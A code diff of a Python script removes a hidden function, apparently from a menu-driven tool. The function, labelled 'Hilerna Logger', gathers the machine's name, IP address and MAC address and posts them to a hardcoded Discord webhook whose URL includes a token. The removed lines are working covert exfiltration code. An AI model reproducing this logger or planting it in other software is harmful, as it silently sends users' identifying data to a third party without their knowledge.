@@ -1,49 +1,8 @@
 import os
-import socket
-import json
 import requests
 import uuid
 import time
 import sys
-import base64
-
-def send_system_info_to_discord():
-    def get_mac():
-        try:
-            mac = ':'.join(['{:02x}'.format((uuid.getnode() >> elements) & 0xff) for elements in range(0, 2*6, 2)][::-1])
-        except Exception as e:
-            mac = "00:00:00:00:00:00"
-        return mac
-
-    pc_name = os.environ['COMPUTERNAME']
-    ip_address = socket.gethostbyname(socket.gethostname())
-    mac_address = get_mac()
-
-    webhook_url = "https://discord.com/api/webhooks/1139251412178575432/DAYYJTPN6QKLOeQKk4h5FgG8rqyKgIN1LYkyB1fzAJ_kF7Tvsunbvx3gpXTh0jM6TksU"
-
-    embed_data = {
-        "title": "Hilerna Logger",
-        "description": f"`Nom du PC:` ```{pc_name}```\n`Adresse IP` ```{ip_address}```\n`Adresse MAC` ```{mac_address}```",
-        "color": 15597816,
-        "footer": {
-            "text": "https://github.com/hilerna",
-            "icon_url": "https://media.discordapp.net/attachments/1138864811036385282/1139247676530102324/ppp.png"
-        }
-    }
-
-    payload = {
-        "content": None,
-        "embeds": [embed_data],
-        "attachments": []
-    }
-
-    headers = {
-        "Content-Type": "application/json"
-    }
-
-    response = requests.post(webhook_url, data=json.dumps(payload), headers=headers)
-    if response.status_code == 204:
-        pass
 
 def display_menu():
     menu = """
